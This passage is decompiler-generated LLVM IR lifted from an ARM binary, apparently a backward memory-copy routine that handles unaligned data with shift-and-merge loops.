  store i32 %v12_1a178, i32* %v11_1a178, align 4
  %v13_1a178 = add i32 %v6_1a178, -4
  %v14_1a178 = inttoptr i32 %v13_1a178 to i32*
  %v15_1a178 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_1a178, i32* %v14_1a178, align 4
  store i32 %v7_1a178, i32* %r0.global-to-local, align 4
  %v6_1a17c = load i32, i32* %r2.global-to-local, align 4
  %v7_1a17c = add i32 %v6_1a17c, -12
  store i32 %v7_1a17c, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb148
  %v6_1a19c44 = phi i32 [ %v6_1a178, %.thread1 ], [ %v7_1a178, %bb148 ]
  %v0_1a18442 = phi i32 [ %v4_1a170, %.thread1 ], [ %v7_1a17c, %bb148 ]
  %v2_1a180 = load i8*, i8** %stack_var_-8, align 4
  %v3_1a180 = ptrtoint i8* %v2_1a180 to i32
  store i32 %v3_1a180, i32* @r4, align 4
  store i32 %v8_1a13c, i32* @lr, align 4
  br label %dec_label_pc_1a184

dec_label_pc_1a184:                               ; preds = %dec_label_pc_1a134, %.thread3
  %v7_1a194 = phi i32 [ %v0_1a14c36, %dec_label_pc_1a134 ], [ %v6_1a19c44, %.thread3 ]
  %v0_1a184 = phi i32 [ %v2_1a134, %dec_label_pc_1a134 ], [ %v0_1a18442, %.thread3 ]
  %v2_1a184 = add i32 %v0_1a184, 8
  store i32 %v2_1a184, i32* %r2.global-to-local, align 4
  %v4_1a184 = sub i32 0, %v0_1a184
  %v5_1a184 = and i32 %v2_1a184, %v4_1a184
  %v6_1a184 = icmp slt i32 %v5_1a184, 0
  store i1 %v6_1a184, i1* %cpsr_v.global-to-local, align 1
  %v7_1a184 = icmp slt i32 %v2_1a184, 0
  store i1 %v7_1a184, i1* %cpsr_n.global-to-local, align 1
  %v8_1a184 = icmp eq i32 %v2_1a184, 0
  store i1 %v8_1a184, i1* %cpsr_z.global-to-local, align 1
  %v5_1a188 = icmp slt i32 %v0_1a184, -8
  br i1 %v5_1a188, label %bb150, label %dec_label_pc_1a18c

dec_label_pc_1a18c:                               ; preds = %dec_label_pc_1a184
  %v6_1a18c = add i32 %v0_1a184, 4
  store i32 %v6_1a18c, i32* %r2.global-to-local, align 4
  %v8_1a18c = sub i32 -5, %v0_1a184
  %v9_1a18c = and i32 %v8_1a18c, %v2_1a184
  %v10_1a18c = icmp slt i32 %v9_1a18c, 0
  store i1 %v10_1a18c, i1* %cpsr_v.global-to-local, align 1
  %v11_1a18c = icmp slt i32 %v6_1a18c, 0
  store i1 %v11_1a18c, i1* %cpsr_n.global-to-local, align 1
  %v12_1a18c = icmp eq i32 %v2_1a184, 4
  store i1 %v12_1a18c, i1* %cpsr_z.global-to-local, align 1
  %v5_1a190 = icmp slt i32 %v2_1a184, 4
  %v6_1a190 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a190 = add i32 %v6_1a190, -4
  %v8_1a190 = inttoptr i32 %v7_1a190 to i32*
  %v9_1a190 = load i32, i32* %v8_1a190, align 4
  store i32 %v9_1a190, i32* @r3, align 4
  br i1 %v5_1a190, label %.thread7, label %bb149

.thread7:                                         ; preds = %dec_label_pc_1a18c
  store i32 %v7_1a190, i32* %r1.global-to-local, align 4
  %v8_1a194 = add i32 %v7_1a194, -4
  %v9_1a194 = inttoptr i32 %v8_1a194 to i32*
  store i32 %v9_1a190, i32* %v9_1a194, align 4
  %v10_1a194 = load i32, i32* %r0.global-to-local, align 4
  %v11_1a194 = add i32 %v10_1a194, -4
  store i32 %v11_1a194, i32* %r0.global-to-local, align 4
  %v0_1a1a4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1a18c
  %v10_1a198 = add i32 %v6_1a190, -8
  %v11_1a198 = inttoptr i32 %v10_1a198 to i32*
  %v12_1a198 = load i32, i32* %v11_1a198, align 4
  store i32 %v12_1a198, i32* @ip, align 4
  store i32 %v10_1a198, i32* %r1.global-to-local, align 4
  %v7_1a19c = add i32 %v7_1a194, -8
  %v8_1a19c = inttoptr i32 %v7_1a19c to i32*
  store i32 %v9_1a190, i32* %v8_1a19c, align 4
  %v10_1a19c = add i32 %v7_1a194, -4
  %v11_1a19c = inttoptr i32 %v10_1a19c to i32*
  %v12_1a19c = load i32, i32* @ip, align 4
  store i32 %v12_1a19c, i32* %v11_1a19c, align 4
  store i32 %v7_1a19c, i32* %r0.global-to-local, align 4
  %v6_1a1a0 = load i32, i32* %r2.global-to-local, align 4
  %v7_1a1a0 = add i32 %v6_1a1a0, -4
  store i32 %v7_1a1a0, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread7, %.thread13, %dec_label_pc_1a184, %dec_label_pc_1a114, %dec_label_pc_1a348, %dec_label_pc_1a2dc, %dec_label_pc_1a270, %bb149
  %v2_1a1a8 = phi i32 [ %v11_1a194, %.thread7 ], [ %v0_1a24019, %.thread13 ], [ %v7_1a194, %dec_label_pc_1a184 ], [ %v2_1a118, %dec_label_pc_1a114 ], [ %v2_1a1b452, %dec_label_pc_1a348 ], [ %v2_1a1b451, %dec_label_pc_1a2dc ], [ %v2_1a1b450, %dec_label_pc_1a270 ], [ %v7_1a19c, %bb149 ]
  %v0_1a1a4 = phi i32 [ %v0_1a1a4.pre, %.thread7 ], [ %v2_1a1e8, %.thread13 ], [ %v2_1a184, %dec_label_pc_1a184 ], [ %v2_1a11c, %dec_label_pc_1a114 ], [ %v0_1a1a448, %dec_label_pc_1a348 ], [ %v0_1a1a447, %dec_label_pc_1a2dc ], [ %v0_1a1a446, %dec_label_pc_1a270 ], [ %v7_1a1a0, %bb149 ]
  %v1_1a1a4 = add i32 %v0_1a1a4, 4
  store i32 %v1_1a1a4, i32* @r2, align 4
  %v3_1a1a4 = sub i32 0, %v0_1a1a4
  %v4_1a1a4 = and i32 %v1_1a1a4, %v3_1a1a4
  %v5_1a1a4 = icmp slt i32 %v4_1a1a4, 0
  store i1 %v5_1a1a4, i1* %cpsr_v.global-to-local, align 1
  %v6_1a1a4 = icmp slt i32 %v1_1a1a4, 0
  store i1 %v6_1a1a4, i1* %cpsr_n.global-to-local, align 1
  %v7_1a1a4 = icmp eq i32 %v1_1a1a4, 0
  store i1 %v7_1a1a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a1a4, label %.thread129, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1a1ac = add i32 %v0_1a1a4, 2
  %v3_1a1ac = sub i32 -3, %v0_1a1a4
  %v4_1a1ac = and i32 %v3_1a1ac, %v1_1a1a4
  %v5_1a1ac = icmp slt i32 %v4_1a1ac, 0
  store i1 %v5_1a1ac, i1* %cpsr_v.global-to-local, align 1
  %v6_1a1ac = icmp slt i32 %v1_1a1ac, 0
  store i1 %v6_1a1ac, i1* %cpsr_n.global-to-local, align 1
  %v7_1a1ac = icmp eq i32 %v1_1a1a4, 2
  store i1 %v7_1a1ac, i1* %cpsr_z.global-to-local, align 1
  %v0_1a1b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a1b0 = add i32 %v0_1a1b0, -1
  %v2_1a1b0 = inttoptr i32 %v1_1a1b0 to i8*
  %v3_1a1b0 = load i8, i8* %v2_1a1b0, align 1
  %v4_1a1b0 = zext i8 %v3_1a1b0 to i32
  store i32 %v4_1a1b0, i32* @r3, align 4
  store i32 %v1_1a1b0, i32* %r1.global-to-local, align 4
  %v3_1a1b4 = add i32 %v2_1a1a8, -1
  %v4_1a1b4 = inttoptr i32 %v3_1a1b4 to i8*
  store i8 %v3_1a1b0, i8* %v4_1a1b4, align 1
  %v5_1a1b4 = load i32, i32* %r0.global-to-local, align 4
  %v6_1a1b4 = add i32 %v5_1a1b4, -1
  store i32 %v6_1a1b4, i32* %r0.global-to-local, align 4
  %v0_1a1b8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1a1b8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1a1b8 = xor i1 %v0_1a1b8, %v1_1a1b8
  br i1 %v2_1a1b8, label %.thread128, label %bb152

bb152:                                            ; preds = %bb151
  %v3_1a1b8 = load i32, i32* %r1.global-to-local, align 4
  %v4_1a1b8 = add i32 %v3_1a1b8, -1
  %v5_1a1b8 = inttoptr i32 %v4_1a1b8 to i8*
  %v6_1a1b8 = load i8, i8* %v5_1a1b8, align 1
  %v7_1a1b8 = zext i8 %v6_1a1b8 to i32
  store i32 %v7_1a1b8, i32* @r3, align 4
  store i32 %v4_1a1b8, i32* %r1.global-to-local, align 4
  %v6_1a1bc = add i32 %v5_1a1b4, -2
  %v7_1a1bc = inttoptr i32 %v6_1a1bc to i8*
  store i8 %v6_1a1b8, i8* %v7_1a1bc, align 1
  %v8_1a1bc = load i32, i32* %r0.global-to-local, align 4
  %v9_1a1bc = add i32 %v8_1a1bc, -1
  store i32 %v9_1a1bc, i32* %r0.global-to-local, align 4
  %v1_1a1c0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1a1c0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread128

.thread128:                                       ; preds = %bb151, %bb152
  %v7_1a1c4 = phi i32 [ %v9_1a1bc, %bb152 ], [ %v6_1a1b4, %bb151 ]
  %v2_1a1c4 = phi i1 [ %v2_1a1c0.pre, %bb152 ], [ %v1_1a1b8, %bb151 ]
  %v1_1a1c4 = phi i1 [ %v1_1a1c0.pre, %bb152 ], [ %v0_1a1b8, %bb151 ]
  %v0_1a1c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1a1c0 = xor i1 %v2_1a1c4, %v1_1a1c4
  %v4_1a1c0 = or i1 %v0_1a1c0, %v3_1a1c0
  br i1 %v4_1a1c0, label %.thread129, label %bb153

bb153:                                            ; preds = %.thread128
  %v5_1a1c0 = load i32, i32* %r1.global-to-local, align 4
  %v6_1a1c0 = add i32 %v5_1a1c0, -1
  %v7_1a1c0 = inttoptr i32 %v6_1a1c0 to i8*
  %v8_1a1c0 = load i8, i8* %v7_1a1c0, align 1
  %v9_1a1c0 = zext i8 %v8_1a1c0 to i32
  store i32 %v9_1a1c0, i32* @r3, align 4
  store i32 %v6_1a1c0, i32* %r1.global-to-local, align 4
  %v8_1a1c4 = add i32 %v7_1a1c4, -1
  %v9_1a1c4 = inttoptr i32 %v8_1a1c4 to i8*
  store i8 %v8_1a1c0, i8* %v9_1a1c4, align 1
  %v10_1a1c4 = load i32, i32* %r0.global-to-local, align 4
  %v11_1a1c4 = add i32 %v10_1a1c4, -1
  store i32 %v11_1a1c4, i32* %r0.global-to-local, align 4
  br label %.thread129

dec_label_pc_1a1cc:                               ; preds = %dec_label_pc_1a124
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1a1cc = icmp eq i32 %v1_1a124, 1
  store i1 %v8_1a1cc, i1* %cpsr_n.global-to-local, align 1
  %v9_1a1cc = icmp eq i32 %v1_1a124, 2
  store i1 %v9_1a1cc, i1* %cpsr_z.global-to-local, align 1
  %v1_1a1d0 = add i32 %v2_1a114, -1
  %v2_1a1d0 = inttoptr i32 %v1_1a1d0 to i8*
  %v3_1a1d0 = load i8, i8* %v2_1a1d0, align 1
  %v4_1a1d0 = zext i8 %v3_1a1d0 to i32
  store i32 %v4_1a1d0, i32* @r3, align 4
  store i32 %v1_1a1d0, i32* %r1.global-to-local, align 4
  %v3_1a1d4 = add i32 %v2_1a118, -1
  %v4_1a1d4 = inttoptr i32 %v3_1a1d4 to i8*
  store i8 %v3_1a1d0, i8* %v4_1a1d4, align 1
  %v5_1a1d4 = load i32, i32* %r0.global-to-local, align 4
  %v6_1a1d4 = add i32 %v5_1a1d4, -1
  store i32 %v6_1a1d4, i32* %r0.global-to-local, align 4
  br i1 %v8_1a1cc, label %.thread13, label %bb154

bb154:                                            ; preds = %dec_label_pc_1a1cc
  %v6_1a1d8 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a1d8 = add i32 %v6_1a1d8, -1
  %v8_1a1d8 = inttoptr i32 %v7_1a1d8 to i8*
  %v9_1a1d8 = load i8, i8* %v8_1a1d8, align 1
  %v10_1a1d8 = zext i8 %v9_1a1d8 to i32
  store i32 %v10_1a1d8, i32* @r3, align 4
  store i32 %v7_1a1d8, i32* %r1.global-to-local, align 4
  %v9_1a1dc = add i32 %v5_1a1d4, -2
  %v10_1a1dc = inttoptr i32 %v9_1a1dc to i8*
  store i8 %v9_1a1d8, i8* %v10_1a1dc, align 1
  %v11_1a1dc = load i32, i32* %r0.global-to-local, align 4
  %v12_1a1dc = add i32 %v11_1a1dc, -1
  store i32 %v12_1a1dc, i32* %r0.global-to-local, align 4
  br i1 %v9_1a1cc, label %.thread13, label %bb155

bb155:                                            ; preds = %bb154
  %v8_1a1e0 = load i32, i32* %r1.global-to-local, align 4
  %v9_1a1e0 = add i32 %v8_1a1e0, -1
  %v10_1a1e0 = inttoptr i32 %v9_1a1e0 to i8*
  %v11_1a1e0 = load i8, i8* %v10_1a1e0, align 1
  %v12_1a1e0 = zext i8 %v11_1a1e0 to i32
  store i32 %v12_1a1e0, i32* @r3, align 4
  store i32 %v9_1a1e0, i32* %r1.global-to-local, align 4
  %v11_1a1e4 = add i32 %v11_1a1dc, -2
  %v12_1a1e4 = inttoptr i32 %v11_1a1e4 to i8*
  store i8 %v11_1a1e0, i8* %v12_1a1e4, align 1
  %v13_1a1e4 = load i32, i32* %r0.global-to-local, align 4
  %v14_1a1e4 = add i32 %v13_1a1e4, -1
  store i32 %v14_1a1e4, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb154, %dec_label_pc_1a1cc, %bb155
  %v0_1a24019 = phi i32 [ %v12_1a1dc, %bb154 ], [ %v6_1a1d4, %dec_label_pc_1a1cc ], [ %v14_1a1e4, %bb155 ]
  %v0_1a1e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a1e8 = load i32, i32* @ip, align 4
  %v2_1a1e8 = sub i32 %v0_1a1e8, %v1_1a1e8
  store i32 %v2_1a1e8, i32* %r2.global-to-local, align 4
  %v4_1a1e8 = xor i32 %v1_1a1e8, %v0_1a1e8
  %v5_1a1e8 = xor i32 %v2_1a1e8, %v0_1a1e8
  %v6_1a1e8 = and i32 %v5_1a1e8, %v4_1a1e8
  %v7_1a1e8 = icmp slt i32 %v6_1a1e8, 0
  store i1 %v7_1a1e8, i1* %cpsr_v.global-to-local, align 1
  %v8_1a1e8 = icmp slt i32 %v2_1a1e8, 0
  store i1 %v8_1a1e8, i1* %cpsr_n.global-to-local, align 1
  %v9_1a1e8 = icmp eq i32 %v0_1a1e8, %v1_1a1e8
  store i1 %v9_1a1e8, i1* %cpsr_z.global-to-local, align 1
  %v5_1a1ec = icmp slt i32 %v0_1a1e8, %v1_1a1e8
  br i1 %v5_1a1ec, label %bb150, label %dec_label_pc_1a1f0

dec_label_pc_1a1f0:                               ; preds = %.thread13
  %v0_1a1f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a1f0 = urem i32 %v0_1a1f0, 4
  store i32 %v1_1a1f0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a1f0 = icmp eq i32 %v1_1a1f0, 0
  store i1 %v2_1a1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a1f0, label %dec_label_pc_1a134, label %dec_label_pc_1a1f8

dec_label_pc_1a1f8:                               ; preds = %dec_label_pc_1a12c, %dec_label_pc_1a1f0
  %v0_1a24018 = phi i32 [ %v2_1a118, %dec_label_pc_1a12c ], [ %v0_1a24019, %dec_label_pc_1a1f0 ]
  %v0_1a2ec = phi i32 [ %v2_1a11c, %dec_label_pc_1a12c ], [ %v2_1a1e8, %dec_label_pc_1a1f0 ]
  %v0_1a1f8 = phi i32 [ %v2_1a114, %dec_label_pc_1a12c ], [ %v0_1a1f0, %dec_label_pc_1a1f0 ]
  %v0_1a200 = phi i32 [ %v1_1a12c, %dec_label_pc_1a12c ], [ %v1_1a1f0, %dec_label_pc_1a1f0 ]
  %v1_1a1f8 = and i32 %v0_1a1f8, -4
  store i32 %v1_1a1f8, i32* %r1.global-to-local, align 4
  %v1_1a1fc = inttoptr i32 %v1_1a1f8 to i32*
  %v2_1a1fc = load i32, i32* %v1_1a1fc, align 4
  store i32 %v2_1a1fc, i32* @r3, align 4
  %v7_1a200 = icmp ult i32 %v0_1a200, 2
  %v2_1a2e4 = add i32 %v0_1a2ec, -12
  %v4_1a2e4 = sub i32 11, %v0_1a2ec
  %v5_1a2e4 = and i32 %v4_1a2e4, %v0_1a2ec
  %v6_1a2e4 = icmp slt i32 %v5_1a2e4, 0
  store i1 %v6_1a2e4, i1* %cpsr_v.global-to-local, align 1
  %v7_1a2e4 = icmp slt i32 %v2_1a2e4, 0
  store i1 %v7_1a2e4, i1* %cpsr_n.global-to-local, align 1
  %v8_1a2e4 = icmp eq i32 %v0_1a2ec, 12
  store i1 %v8_1a2e4, i1* %cpsr_z.global-to-local, align 1
  %v5_1a2e8 = icmp slt i32 %v0_1a2ec, 12
  br i1 %v7_1a200, label %dec_label_pc_1a2e4, label %dec_label_pc_1a208

dec_label_pc_1a208:                               ; preds = %dec_label_pc_1a1f8
  %v8_1a200 = icmp eq i32 %v0_1a200, 2
  br i1 %v8_1a200, label %dec_label_pc_1a278, label %dec_label_pc_1a20c

dec_label_pc_1a20c:                               ; preds = %dec_label_pc_1a208
  br i1 %v5_1a2e8, label %dec_label_pc_1a258, label %dec_label_pc_1a214

dec_label_pc_1a214:                               ; preds = %dec_label_pc_1a20c
  store i32 %v2_1a2e4, i32* %r2.global-to-local, align 4
  %v3_1a218 = load i32, i32* @r4, align 4
  store i32 %v3_1a218, i32* %stack_var_-12, align 4
  %v6_1a218 = load i32, i32* @r5, align 4
  %v8_1a218 = inttoptr i32 %v6_1a218 to i8*
  store i8* %v8_1a218, i8** %stack_var_-8, align 4
  %v11_1a218 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1a21c

dec_label_pc_1a21c:                               ; preds = %dec_label_pc_1a21c.dec_label_pc_1a21c_crit_edge, %dec_label_pc_1a214
  %v0_1a240 = phi i32 [ %v1_1a240, %dec_label_pc_1a21c.dec_label_pc_1a21c_crit_edge ], [ %v0_1a24018, %dec_label_pc_1a214 ]
  %v0_1a220 = phi i32 [ %v0_1a220.pre, %dec_label_pc_1a21c.dec_label_pc_1a21c_crit_edge ], [ %v1_1a1f8, %dec_label_pc_1a214 ]
  %v0_1a21c = phi i32 [ %v0_1a21c.pre, %dec_label_pc_1a21c.dec_label_pc_1a21c_crit_edge ], [ %v2_1a1fc, %dec_label_pc_1a214 ]
  %v3_1a21c = mul i32 %v0_1a21c, 256
  store i32 %v3_1a21c, i32* %lr.global-to-local, align 4
  %v1_1a220 = add i32 %v0_1a220, -4
  %v2_1a220 = inttoptr i32 %v1_1a220 to i32*
  %v3_1a220 = load i32, i32* %v2_1a220, align 4
  store i32 %v3_1a220, i32* @r3, align 4
  %v4_1a220 = add i32 %v0_1a220, -8
  %v5_1a220 = inttoptr i32 %v4_1a220 to i32*
  %v6_1a220 = load i32, i32* %v5_1a220, align 4
  store i32 %v6_1a220, i32* %r4.global-to-local, align 4
  %v7_1a220 = add i32 %v0_1a220, -12
  %v8_1a220 = inttoptr i32 %v7_1a220 to i32*
  %v9_1a220 = load i32, i32* %v8_1a220, align 4
  store i32 %v9_1a220, i32* %r5.global-to-local, align 4
  %v10_1a220 = add i32 %v0_1a220, -16
  %v11_1a220 = inttoptr i32 %v10_1a220 to i32*
  %v12_1a220 = load i32, i32* %v11_1a220, align 4
  store i32 %v10_1a220, i32* %r1.global-to-local, align 4
  %v4_1a224 = udiv i32 %v12_1a220, 16777216
  %v5_1a224 = or i32 %v4_1a224, %v3_1a21c
  store i32 %v5_1a224, i32* %lr.global-to-local, align 4
  %v3_1a228 = mul i32 %v12_1a220, 256
  %v4_1a22c = udiv i32 %v9_1a220, 16777216
  %v5_1a22c = or i32 %v3_1a228, %v4_1a22c
  store i32 %v5_1a22c, i32* @ip, align 4
  %v3_1a230 = mul i32 %v9_1a220, 256
  %v4_1a234 = udiv i32 %v6_1a220, 16777216
  %v5_1a234 = or i32 %v3_1a230, %v4_1a234
  store i32 %v5_1a234, i32* %r5.global-to-local, align 4
  %v3_1a238 = mul i32 %v6_1a220, 256
  %v4_1a23c = udiv i32 %v3_1a220, 16777216
  %v5_1a23c = or i32 %v3_1a238, %v4_1a23c
  store i32 %v5_1a23c, i32* %r4.global-to-local, align 4
  %v1_1a240 = add i32 %v0_1a240, -16
  %v2_1a240 = inttoptr i32 %v1_1a240 to i32*
  store i32 %v5_1a23c, i32* %v2_1a240, align 4
  %v4_1a240 = add i32 %v0_1a240, -12
  %v5_1a240 = inttoptr i32 %v4_1a240 to i32*
  %v6_1a240 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1a240, i32* %v5_1a240, align 4
  %v7_1a240 = add i32 %v0_1a240, -8
  %v8_1a240 = inttoptr i32 %v7_1a240 to i32*
  %v9_1a240 = load i32, i32* @ip, align 4
  store i32 %v9_1a240, i32* %v8_1a240, align 4
  %v10_1a240 = add i32 %v0_1a240, -4
  %v11_1a240 = inttoptr i32 %v10_1a240 to i32*
  %v12_1a240 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1a240, i32* %v11_1a240, align 4
  store i32 %v1_1a240, i32* %r0.global-to-local, align 4
  %v0_1a244 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a244 = add i32 %v0_1a244, -16
  store i32 %v2_1a244, i32* %r2.global-to-local, align 4
  %v6_1a248 = icmp slt i32 %v0_1a244, 16
  br i1 %v6_1a248, label %dec_label_pc_1a24c, label %dec_label_pc_1a21c.dec_label_pc_1a21c_crit_edge

dec_label_pc_1a21c.dec_label_pc_1a21c_crit_edge:  ; preds = %dec_label_pc_1a21c
  %v0_1a21c.pre = load i32, i32* @r3, align 4
  %v0_1a220.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a21c

dec_label_pc_1a24c:                               ; preds = %dec_label_pc_1a21c
  %v2_1a24c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a24c, i32* @r4, align 4
  %v5_1a24c = load i8*, i8** %stack_var_-8, align 4
  %v6_1a24c = ptrtoint i8* %v5_1a24c to i32
  store i32 %v6_1a24c, i32* @r5, align 4
  store i32 %v11_1a218, i32* @lr, align 4
  %v2_1a250 = add i32 %v0_1a244, -4
  store i32 %v2_1a250, i32* %r2.global-to-local, align 4
  %v4_1a250 = add i32 %v0_1a244, 2147483632
  %v5_1a250 = and i32 %v2_1a250, %v4_1a250
  %v6_1a250 = icmp slt i32 %v5_1a250, 0
  store i1 %v6_1a250, i1* %cpsr_v.global-to-local, align 1
  %v7_1a250 = icmp slt i32 %v2_1a250, 0
  store i1 %v7_1a250, i1* %cpsr_n.global-to-local, align 1
  %v8_1a250 = icmp eq i32 %v2_1a250, 0
  store i1 %v8_1a250, i1* %cpsr_z.global-to-local, align 1
  %v5_1a254 = icmp slt i32 %v2_1a244, -12
  br i1 %v5_1a254, label %dec_label_pc_1a270, label %dec_label_pc_1a258

dec_label_pc_1a258:                               ; preds = %dec_label_pc_1a24c, %dec_label_pc_1a20c, %dec_label_pc_1a258
  %v1_1a264 = phi i32 [ %v5_1a264, %dec_label_pc_1a258 ], [ %v1_1a240, %dec_label_pc_1a24c ], [ %v0_1a24018, %dec_label_pc_1a20c ]
  %v0_1a258 = load i32, i32* @r3, align 4
  %v3_1a258 = mul i32 %v0_1a258, 256
  store i32 %v3_1a258, i32* %ip.global-to-local, align 4
  %v0_1a25c = load i32, i32* %r1.global-to-local, align 4
  %v1_1a25c = add i32 %v0_1a25c, -4
  %v2_1a25c = inttoptr i32 %v1_1a25c to i32*
  %v3_1a25c = load i32, i32* %v2_1a25c, align 4
  store i32 %v3_1a25c, i32* @r3, align 4
  store i32 %v1_1a25c, i32* %r1.global-to-local, align 4
  %v4_1a260 = udiv i32 %v3_1a25c, 16777216
  %v5_1a260 = or i32 %v4_1a260, %v3_1a258
  store i32 %v5_1a260, i32* @ip, align 4
  %v2_1a264 = add i32 %v1_1a264, -4
  %v3_1a264 = inttoptr i32 %v2_1a264 to i32*
  store i32 %v5_1a260, i32* %v3_1a264, align 4
  %v4_1a264 = load i32, i32* %r0.global-to-local, align 4
  %v5_1a264 = add i32 %v4_1a264, -4
  store i32 %v5_1a264, i32* %r0.global-to-local, align 4
  %v0_1a268 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a268 = add i32 %v0_1a268, -4
  store i32 %v2_1a268, i32* %r2.global-to-local, align 4
  %v6_1a26c = icmp slt i32 %v0_1a268, 4
  br i1 %v6_1a26c, label %dec_label_pc_1a270.loopexit, label %dec_label_pc_1a258

dec_label_pc_1a270.loopexit:                      ; preds = %dec_label_pc_1a258
  %v4_1a268 = sub i32 3, %v0_1a268
  %v5_1a268 = and i32 %v4_1a268, %v0_1a268
  %v6_1a268 = icmp slt i32 %v5_1a268, 0
  %v7_1a268 = icmp slt i32 %v2_1a268, 0
  store i1 %v6_1a268, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1a268, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a270

dec_label_pc_1a270:                               ; preds = %dec_label_pc_1a270.loopexit, %dec_label_pc_1a24c
  %v2_1a1b450 = phi i32 [ %v5_1a264, %dec_label_pc_1a270.loopexit ], [ %v1_1a240, %dec_label_pc_1a24c ]
  %v0_1a1a446 = phi i32 [ %v2_1a268, %dec_label_pc_1a270.loopexit ], [ %v2_1a250, %dec_label_pc_1a24c ]
  %v0_1a270 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a270 = add i32 %v0_1a270, 3
  store i32 %v1_1a270, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_1a278:                               ; preds = %dec_label_pc_1a208
  br i1 %v5_1a2e8, label %dec_label_pc_1a2c4, label %dec_label_pc_1a280

dec_label_pc_1a280:                               ; preds = %dec_label_pc_1a278
  store i32 %v2_1a2e4, i32* %r2.global-to-local, align 4
  %v3_1a284 = load i32, i32* @r4, align 4
  store i32 %v3_1a284, i32* %stack_var_-12, align 4
  %v6_1a284 = load i32, i32* @r5, align 4
  %v8_1a284 = inttoptr i32 %v6_1a284 to i8*
  store i8* %v8_1a284, i8** %stack_var_-8, align 4
  %v11_1a284 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1a288

dec_label_pc_1a288:                               ; preds = %dec_label_pc_1a288.dec_label_pc_1a288_crit_edge, %dec_label_pc_1a280
  %v0_1a2ac = phi i32 [ %v1_1a2ac, %dec_label_pc_1a288.dec_label_pc_1a288_crit_edge ], [ %v0_1a24018, %dec_label_pc_1a280 ]
  %v0_1a28c = phi i32 [ %v0_1a28c.pre, %dec_label_pc_1a288.dec_label_pc_1a288_crit_edge ], [ %v1_1a1f8, %dec_label_pc_1a280 ]
  %v0_1a288 = phi i32 [ %v0_1a288.pre, %dec_label_pc_1a288.dec_label_pc_1a288_crit_edge ], [ %v2_1a1fc, %dec_label_pc_1a280 ]
  %v3_1a288 = mul i32 %v0_1a288, 65536
  store i32 %v3_1a288, i32* %lr.global-to-local, align 4
  %v1_1a28c = add i32 %v0_1a28c, -4
  %v2_1a28c = inttoptr i32 %v1_1a28c to i32*
  %v3_1a28c = load i32, i32* %v2_1a28c, align 4
  store i32 %v3_1a28c, i32* @r3, align 4
  %v4_1a28c = add i32 %v0_1a28c, -8
  %v5_1a28c = inttoptr i32 %v4_1a28c to i32*
  %v6_1a28c = load i32, i32* %v5_1a28c, align 4
  store i32 %v6_1a28c, i32* %r4.global-to-local, align 4
  %v7_1a28c = add i32 %v0_1a28c, -12
  %v8_1a28c = inttoptr i32 %v7_1a28c to i32*
  %v9_1a28c = load i32, i32* %v8_1a28c, align 4
  store i32 %v9_1a28c, i32* %r5.global-to-local, align 4
  %v10_1a28c = add i32 %v0_1a28c, -16
  %v11_1a28c = inttoptr i32 %v10_1a28c to i32*
  %v12_1a28c = load i32, i32* %v11_1a28c, align 4
  store i32 %v10_1a28c, i32* %r1.global-to-local, align 4
  %v4_1a290 = udiv i32 %v12_1a28c, 65536
  %v5_1a290 = or i32 %v4_1a290, %v3_1a288
  store i32 %v5_1a290, i32* %lr.global-to-local, align 4
  %v3_1a294 = mul i32 %v12_1a28c, 65536
  %v4_1a298 = udiv i32 %v9_1a28c, 65536
  %v5_1a298 = or i32 %v3_1a294, %v4_1a298
  store i32 %v5_1a298, i32* @ip, align 4
  %v3_1a29c = mul i32 %v9_1a28c, 65536
  %v4_1a2a0 = udiv i32 %v6_1a28c, 65536
  %v5_1a2a0 = or i32 %v3_1a29c, %v4_1a2a0
  store i32 %v5_1a2a0, i32* %r5.global-to-local, align 4
  %v3_1a2a4 = mul i32 %v6_1a28c, 65536
  %v4_1a2a8 = udiv i32 %v3_1a28c, 65536
  %v5_1a2a8 = or i32 %v3_1a2a4, %v4_1a2a8
  store i32 %v5_1a2a8, i32* %r4.global-to-local, align 4
  %v1_1a2ac = add i32 %v0_1a2ac, -16
  %v2_1a2ac = inttoptr i32 %v1_1a2ac to i32*
  store i32 %v5_1a2a8, i32* %v2_1a2ac, align 4
  %v4_1a2ac = add i32 %v0_1a2ac, -12
  %v5_1a2ac = inttoptr i32 %v4_1a2ac to i32*
  %v6_1a2ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1a2ac, i32* %v5_1a2ac, align 4
  %v7_1a2ac = add i32 %v0_1a2ac, -8
  %v8_1a2ac = inttoptr i32 %v7_1a2ac to i32*
  %v9_1a2ac = load i32, i32* @ip, align 4
